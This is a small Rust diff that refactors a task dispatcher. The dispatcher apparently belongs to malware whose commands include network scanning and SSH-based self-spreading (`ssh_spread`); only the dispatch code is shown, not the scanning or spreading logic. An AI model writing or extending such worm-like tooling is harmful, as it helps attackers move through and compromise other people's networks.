@@ -257,18 +257,20 @@ pub fn run_task(task: Task) {
             }
         }
         NETWORK_SCAN_CMD => {
+            let trimmed_data = task.data.trim().to_string();
             thread::spawn(|| {
                 network_scan::network_scan(
                     &RUNNING_TASKS,
                     task.id,
-                    task.data.trim().to_string());
+                    trimmed_data);
             });
         }
         SSH_SPREAD => {
+            let trimmed_data = task.data.trim().to_string();
             thread::spawn(|| {
                 ssh_spread(&RUNNING_TASKS,
                            task.id,
-                           task.data.trim().to_string());
+                           trimmed_data);
             });
         }
         _ => {}
